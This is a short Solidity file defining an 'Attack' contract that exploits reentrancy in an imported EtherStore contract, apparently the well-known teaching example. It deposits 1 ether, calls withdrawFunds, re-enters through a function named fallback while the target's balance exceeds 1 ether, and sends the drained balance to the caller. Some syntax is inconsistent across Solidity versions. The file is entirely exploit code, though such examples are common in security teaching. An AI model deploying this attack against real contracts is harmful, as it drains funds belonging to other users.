import "./EtherStore.sol";

contract Attack {
  EtherStore public etherStore;

  // initialize the etherStore variable with the contract address
  constructor(address _etherStoreAddress){
    etherStore = EtherStore(_etherStoreAddress);
  }

  function attackEtherStore() public payable {
    // attack to the nearest ether
    require(msg.value >= 1 ether);
    // sent eth to the depositFunds() function
    etherStore.depositFunds.value(1 ether)();
    // start the magic
    etherStore.withdrawFunds(1 ether);
  }

  function collectEther() public {
    msg.sender.transfer(this.balance);
  }

  function fallback() public payable {
    if(etherStore.balance > 1 ether){
      etherStore.withdrawFunds(1 ether);
    }
  }
}